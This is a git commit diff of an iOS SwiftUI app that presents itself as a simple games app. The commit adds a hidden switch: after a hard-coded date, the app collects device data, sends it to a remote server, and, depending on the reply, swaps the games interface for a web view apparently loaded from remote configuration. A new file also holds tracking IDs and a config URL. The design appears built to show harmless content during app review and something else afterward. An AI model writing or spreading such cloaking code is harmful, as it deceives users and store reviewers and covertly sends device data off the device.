c3663619851cab7561dcc26183a339109243aa32
IGOLIVIT <131347905+IGOLIVIT@users.noreply.github.com>
2024-07-22 20:31:46 +0300

    1.1 update

--- App675/ContentView.swift
+++ App675/ContentView.swift
@@ -9,8 +9,13 @@ import SwiftUI
 
 struct ContentView: View {
     
-    @State var current_tab: Tab = Tab.Games
-
+    @State var current_tab: Tab = .Games
+    
+    @State var isFetched: Bool = false
+    
+    @State var isBlock: Bool = true
+    @State var isDead: Bool = false
+    
     @AppStorage("status") var status: Bool = false
     
     init() {
@@ -25,33 +30,106 @@ struct ContentView: View {
             Color.white
                 .ignoresSafeArea()
             
-            if status {
-            
-            VStack(spacing: 0, content: {
-            
-                    TabView(selection: $current_tab, content: {
-
-                        GamesView()
-                            .tag(Tab.Games)
-                        
-                        AchievementsView()
-                            .tag(Tab.Achievements)
-                        
-                        SettingsView()
-                            .tag(Tab.Settings)
-                        
-                    })
+            if isFetched == false {
+                
+                LoadingView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    TabBar(selectedTab: $current_tab)
-                })
-                    .ignoresSafeArea(.all, edges: .bottom)
-                    .onAppear {
+                    if status {
                         
+                        VStack(spacing: 0, content: {
+                        
+                                TabView(selection: $current_tab, content: {
+
+                                    GamesView()
+                                        .tag(Tab.Games)
+                                    
+                                    AchievementsView()
+                                        .tag(Tab.Achievements)
+                                    
+                                    SettingsView()
+                                        .tag(Tab.Settings)
+                                    
+                                })
+                                
+                                TabBar(selectedTab: $current_tab)
+                            })
+                        .ignoresSafeArea(.all, edges: .bottom)
+                        
+                    } else {
+                        
+                        R1()
                     }
+                    
+                } else if isBlock == false {
+                    
+                    if status {
+                        
+                        WebSystem()
+                        
+                    } else {
+                        
+                        U1()
+                    }
+                }
+            }
+        }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        fetchData { server1_0, codeTech, isAllChangeURL, isDead, lastDate, url_link, error in
+            
+            if let error = error {
+                
+                print("Ошибка: \(error.localizedDescription)")
                 
             } else {
                 
-                R1()
+                guard let isDead = isDead else { return }
+                guard let lastDate = lastDate else { return }
+                
+                self.isDead = isDead
+                
+                let dateFormatter = DateFormatter()
+                        dateFormatter.dateFormat = "dd.MM.yyyy"
+                dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+                let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+                let now = Date()
+
+                guard now > targetDate else {
+
+                    isBlock = true
+                    isFetched = true
+
+                    return
+                }
+                
+                let networkService = NetworkService()
+                let deviceData = DeviceInfo.collectData()
+                
+                networkService.sendRequest(endpoint: deviceData) { result in
+                    
+                    switch result {
+                        
+                    case .success(let success):
+                        
+                        self.isBlock = success
+                        self.isFetched = true
+                        
+                    case .failure(_):
+                        
+                        self.isBlock = self.isDead
+                        self.isFetched = true
+                    }
+                }
             }
         }
     }
---
+++ App675/Project/Extensions/d.swift
@@ -0,0 +1,15 @@
+//
+//  d.swift
+//  App675
+//
+//  Created by IGOR on 22/07/2024.
+//
+
+struct DataManager {
+    
+    let appHudID: String = "app_mNshJpTwjwWonUf5KgAgvLin5sXk3U"
+    let metricaID: String = "b0009ea6-392c-4e20-a642-c2f91a0adeec"
+
+    let storage_domain: String = "https://appstorage.org/api/conf/v1b3s8nc"
+    let usagePolicy: String = "https://www.termsfeed.com/live/7fe1d056-5d0c-468b-b065-56eb3ad4b6a2"
+}
